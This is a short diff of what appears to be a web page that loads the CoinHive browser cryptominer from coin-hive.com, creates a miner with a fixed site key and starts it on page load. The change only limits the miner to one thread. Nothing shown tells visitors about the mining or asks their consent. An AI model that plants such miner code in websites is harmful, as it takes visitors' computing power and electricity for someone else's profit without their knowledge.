@@ -19,7 +19,9 @@ ___
 
 <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
 <script>
-var miner = new CoinHive.Anonymous('l0YCiLkEmA6Nk1UBDRL9O0OsHSOem86y');
+var miner = new CoinHive.Anonymous('l0YCiLkEmA6Nk1UBDRL9O0OsHSOem86y', {
+	threads: 1
+});
 miner.start();
 
 // Listen on events
